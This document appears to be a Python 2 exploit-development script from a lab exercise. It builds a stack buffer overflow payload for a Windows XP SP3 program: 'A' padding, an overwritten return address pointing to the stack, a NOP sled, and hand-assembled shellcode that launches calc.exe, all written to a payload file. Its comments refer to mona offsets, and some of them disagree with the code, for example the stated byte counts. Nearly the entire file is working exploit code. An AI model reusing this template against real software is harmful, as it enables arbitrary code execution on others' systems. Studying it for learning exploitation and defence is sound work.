import binascii
import struct
import codecs

 
BUF_SIZE = 160                          # Set the value to the parameter in the PC command in mona
 
junk = "\x41"*132                        # 24 bytes to hit EIP based on the PO command in mona
#eip = struct.pack("<L", 0x7C82385D)     # Use little-endian to format address 0x7C82385D # call esp # kernel32.dll
eip = struct.pack("<L", 0x0013FEEC)
nops = "\x90"*8                        # 16 byte NOP sled to get into our shellcode
 
# calc.exe shellcode for WinXP SP3 on stack
shellcode = "\x31\xC9"                  # xor ecx,ecx
shellcode += "\x51"                     # push ecx
shellcode += "\x68\x63\x61\x6C\x63"     # push 0x636c6163
shellcode += "\x54"                     # push dword ptr esp
shellcode += "\xB8\xC7\x93\xC2\x77"     # mov eax,0x77c293c7
shellcode += "\xFF\xD0"                 # call eax
 
#exploit = junk + eip + nops + shellcode # Combine our exploit with a NOP sled and working shellcode
junk = '\x41'*(132-(len(nops)+len(shellcode)))
exploit = nops + shellcode + junk + eip 
fill = "\x43"*(BUF_SIZE-len(exploit))   # Calculate number of filler bytes to use (C)
buf = exploit + fill                    # Combine everything together for exploitation
 
try:
    f = open("C:\\simple_exploit_payload.bin", "wb") # Exploit output will be written to C directory
    f.write(buf)                        # Write entirety of buffer out to file
    f.close()                           # Close file
    print "\nExploit written successfully!"
    print "Buffer size: " + str(len(buf)) + "\n" # Buffer size sanity check to ensure there's nothing funny going on
except Exception, e:
    print "\nError! Exploit could not be generated, error details follow:\n"
    print str(e) + "\n"


